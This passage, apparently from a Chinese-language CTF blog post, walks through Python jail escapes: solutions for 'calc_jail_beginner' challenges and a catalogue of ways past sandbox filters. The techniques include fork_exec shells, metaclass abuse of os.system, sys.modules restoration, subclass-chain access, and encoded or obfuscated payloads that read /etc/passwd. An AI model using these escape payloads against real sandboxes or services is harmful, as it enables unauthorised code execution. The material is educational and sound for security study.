class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Welcome to the python jail</span></span><br><span class="line"><span class="string">Let&#x27;</span>s have an beginner jail of calc</span><br><span class="line">Enter your expression <span class="keyword">and</span> I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">White <span class="built_in">list</span> of audit hook ===&gt; builtins.<span class="built_in">input</span>,builtins.<span class="built_in">input</span>/result,<span class="built_in">exec</span>,<span class="built_in">compile</span></span><br><span class="line">Some code of python jail:</span><br><span class="line"></span><br><span class="line">    dict_global = <span class="built_in">dict</span>()</span><br><span class="line">    input_code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    complie_code = <span class="built_in">compile</span>(input_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line"></span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure></div><p>和上面那题不同，在这里我们仅有一次代码执行机会。</p><p>不过不慌，我们之前提到了 python 3.8 引入的海象运算符，还是可以通过用海象运算符和 <code>list</code>  的方式弄出代码：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[os := <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>), _posixsubprocess := __loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>), _posixsubprocess.fork_exec([<span class="string">b&quot;/bin/sh&quot;</span>], [<span class="string">b&quot;/bin/sh&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>)]</span><br></pre></td></tr></table></figure></div><p>但是 payload 发送过去之后，能弹 shell，但是 shell 秒关，输入任何命令也不见回显。</p><p>可以看看假设我们暴力多次尝试起 shell，会发生什么：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[os := <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>), _posixsubprocess := __loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>), [_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/sh&quot;</span>], [<span class="string">b&quot;/bin/sh&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>)]]</span><br></pre></td></tr></table></figure></div><p>先将要执行的 shell 命令复制进剪贴板，然后在它疯狂回显的时候，疯狂粘贴回车，看看能不能执行。结果居然有一定概率会回显执行命令的结果！于是就在这种破烂 shell 下拿到了 flag……</p><p>不过还有更加优雅（？）的做法：利用 <code>itertools</code>  中的<a class="link" href="https://zhuanlan.zhihu.com/p/34139147">无限迭代器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>来暴力起 shell。不过实测好像并达不到无限：猜测远程起进程的个数有限，到一定数目之后会炸：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[os := <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>), itertools := __loader__.load_module(<span class="string">&#x27;itertools&#x27;</span>), _posixsubprocess := __loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>), [_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/sh&quot;</span>], [<span class="string">b&quot;/bin/sh&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>) <span class="keyword">for</span> i <span class="keyword">in</span> itertools.count(<span class="number">0</span>)]]</span><br></pre></td></tr></table></figure></div><h3 id="calc_jail_beginner_level7"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level7">#</a> calc_jail_beginner_level7</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">G</span><br><span class="line">=================================================================================================</span><br><span class="line">==        Black List AST:                                                                      ==</span><br><span class="line">==                       &#x27;Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==</span><br><span class="line">==                        Sub,Mult,Div,Del&#x27;                                                    ==</span><br><span class="line">=================================================================================================</span><br></pre></td></tr></table></figure></div><p>虽然没有了 import 和 call，但有一个魔术方法<a class="link" href="https://zhuanlan.zhihu.com/p/149126959"> metaclass <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。可以通过 metaclass 给类添加属性。</p><p>猜测一下，既然能添加类的属性，那是否可以修改呢？也就是说如果我们将一个类的某一个属性修改为 <code>os.system</code>  这样的函数，那么这样一来在我们调用的时候就可以执行了。现在的问题是需要一个可以传入字符串的属性，发现正好 <code>__getitem__</code> 符合条件。</p><p><code>__getitem__</code> 是用来取列表或者字典的值的一个属性，如果我们将一个类的 <code>__getitem__</code> 改为 <code>os.system</code>  的话是不是就可以执行 shell 了哈哈</p><p>举个例子：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WOOD</span>():</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">WOOD.__getitem__=os.system</span><br><span class="line">WOOD()[<span class="string">&#x27;ls&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>运行后发现执行了 ls 但这样依然无法解决这个题，如果我们将上述代码转为 AST 查看，会发现有 Call 和 Expr</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line">src=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class WOOD():</span></span><br><span class="line"><span class="string">pass</span></span><br><span class="line"><span class="string">WOOD.__getitem__=os.system</span></span><br><span class="line"><span class="string">WOOD()[&#x27;ls&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ast_node = ast.parse(src, <span class="string">&quot;test&quot;</span>, mode=<span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ast.dump(ast_node))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Module(body=[Import(names=[alias(name=&#x27;os&#x27;, asname=None)]), ClassDef(name=&#x27;WOOD&#x27;, bases=[], keywords=[], body=[Pass()], decorator_list=[]), Assign(targets=[Attribute(value=Name(id=&#x27;WOOD&#x27;, ctx=Load()), attr=&#x27;__getitem__&#x27;, ctx=Store())], value=Attribute(value=Name(id=&#x27;os&#x27;, ctx=Load()), attr=&#x27;system&#x27;, ctx=Load()), type_comment=None), Expr(value=Subscript(value=Call(func=Name(id=&#x27;WOOD&#x27;, ctx=Load()), args=[], keywords=[]), slice=Index(value=Constant(value=&#x27;ls&#x27;, kind=None)), ctx=Load()))], type_ignores=[])</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><p>对于如何避开 <code>Expr</code> ，我们给执行的内容赋值就行。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmp = WOOD()[<span class="string">&#x27;ls&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>如何绕过 <code>Call</code> ？可以用 <code>metaclass</code> ，我们指定一个类的 <code>__getitem__==os.system</code> ，使用 mateclass 可以让类拥有属性，但不是类生成的对象具有这个属性，这样我们就不用调用实例化类的 Call，从而进行绕过 Call。</p><p>因此最终 payload 为:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WOOD</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__=os.system</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WHALE</span>(metaclass=WOOD):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">tmp = WHALE[<span class="string">&#x27;sh&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/09/KHuyBwsjt1FZEQP.png" alt="image.png"></p><h2 id="rce"><a class="markdownIt-Anchor" href="#rce">#</a> RCE</h2><h3 id="绕过删除模块或方法"><a class="markdownIt-Anchor" href="#绕过删除模块或方法">#</a> 绕过删除模块或方法</h3><p><code>del</code>  会删除模块或方法，比如下面删除了 <code>builitins</code>  模块的 <code>eval</code>  方法</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br></pre></td></tr></table></figure></div><h4 id="reload重加载"><a class="markdownIt-Anchor" href="#reload重加载">#</a> reload 重加载</h4><p>reload 可以重新加载被删除的模块</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure></div><p>在 Python 3 中， <code>reload() </code> 函数被移动到 <code>importlib</code>  模块中，所以如果要使用  <code>reload()</code>  函数，需要先导入 <code>importlib</code>  模块。</p><h4 id="恢复-sysmodules"><a class="markdownIt-Anchor" href="#恢复-sysmodules">#</a> 恢复 sys.modules</h4><p>一些过滤中可能将  <code>sys.modules['os']</code>  进行修改。这个时候即使将 os 模块导入进来，也是无法使用的.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;system&#x27;</span></span><br></pre></td></tr></table></figure></div><p>由于很多别的命令执行库也使用到了 os, 因此也会受到相应的影响，例如 subprocess</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;</span>, line <span class="number">688</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Popen</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  File <span class="string">&quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;</span>, line <span class="number">1708</span>, <span class="keyword">in</span> Popen</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_handle_exitstatus</span>(<span class="params">self, sts, _WIFSIGNALED=os.WIFSIGNALED,</span></span><br><span class="line"><span class="params">AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;WIFSIGNALED&#x27;</span></span></span><br></pre></td></tr></table></figure></div><p>由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载，没有则加载。因此我们只需要将 os 模块删除，然后再次导入即可.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>] <span class="comment">#删除os模块</span></span><br><span class="line"><span class="keyword">import</span> os <span class="comment">#重新导入</span></span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="基于继承链获取"><a class="markdownIt-Anchor" href="#基于继承链获取">#</a> 基于继承链获取</h4><p>在清空了  <code>__builtins__</code> 的情况下，我们也可以通过索引 subclasses 来找到这些内建函数。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据环境找到 bytes 的索引，此处为 5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">5</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><p>在上面 <code>calc_jail_beginner_level4.1</code>  题目中运用到了这个方式</p><h3 id="绕过基于字符串匹配的过滤"><a class="markdownIt-Anchor" href="#绕过基于字符串匹配的过滤">#</a> 绕过基于字符串匹配的过滤</h3><h4 id="字符串转换"><a class="markdownIt-Anchor" href="#字符串转换">#</a> 字符串转换</h4><h5 id="字符串拼接"><a class="markdownIt-Anchor" href="#字符串拼接">#</a> 字符串拼接</h5><p>在我们的 payload 中，例如如下的 payload， <code>__builtins__</code>   <code>file</code>  这些字符串如果被过滤了，就可以使用字符串变换的方式进行绕过。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div><p>局限性：如果过滤的是  <code>__class__</code>  或者  <code>__mro__</code>  这样的属性名，就无法采用变形来绕过了。</p><h5 id="base64变形"><a class="markdownIt-Anchor" href="#base64变形">#</a> base64 变形</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div><h5 id="逆序"><a class="markdownIt-Anchor" href="#逆序">#</a> 逆序</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">kali</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">kali</span><br></pre></td></tr></table></figure></div><p>注意 exec 与 eval 在执行上有所差异。</p><blockquote><p><code>eval</code>  函数用于计算传递给它的 Python 表达式，并返回结果。它通常用于<strong>执行单一表达式</strong>，并将其结果赋值给变量。</p><p><code>exec</code>  函数用于执行包含 Python 代码块的字符串。它通常用于<strong>执行多行代码</strong>，而不返回任何结果。</p></blockquote><h5 id="进制转换"><a class="markdownIt-Anchor" href="#进制转换">#</a> 进制转换</h5><p>八进制：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br></pre></td></tr></table></figure></div><p>十六进制：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br></pre></td></tr></table></figure></div><h5 id="其他编码"><a class="markdownIt-Anchor" href="#其他编码">#</a> 其他编码</h5><p>hex、rot13、base32 等。</p><h4 id="过滤了属性名或者函数名"><a class="markdownIt-Anchor" href="#过滤了属性名或者函数名">#</a> 过滤了属性名或者函数名</h4><p>在 payload 的构造中，我们大量的使用了各种类中的属性，例如  <code>__class__</code> 、 <code>__import__</code>  等。</p><h5 id="getattr-函数"><a class="markdownIt-Anchor" href="#getattr-函数">#</a> getattr 函数</h5><p>getattr 是 python 的内置函数，用于获取对象的属性或方法，其语法如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">object</span>,name[,default])</span><br></pre></td></tr></table></figure></div><p>这里，object 是对象，name 是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br></pre></td></tr></table></figure></div><p>这样一来，就可以将 payload 中的属性名转化为字符串，字符串的变换方式多种多样，更易于绕过黑名单。</p><h5 id="__getattribute__-函数"><a class="markdownIt-Anchor" href="#__getattribute__-函数">#</a>  <code>__getattribute__</code>  函数</h5><p><code>__getattribute__</code>  于，它定义了当我们尝试获取一个对象的属性时应该进行的操作。</p><p>它的基本语法如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattribute__</span>(<span class="params">self, name</span>):</span><br></pre></td></tr></table></figure></div><p>getattr 函数在调用时，实际上就是调用这个类的  <code>__getattribute__</code>  方法。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br></pre></td></tr></table></figure></div><h5 id="__getattr__-函数"><a class="markdownIt-Anchor" href="#__getattr__-函数">#</a>  <code>__getattr__</code>  函数</h5><p><code>__getattr__</code>  是 Python 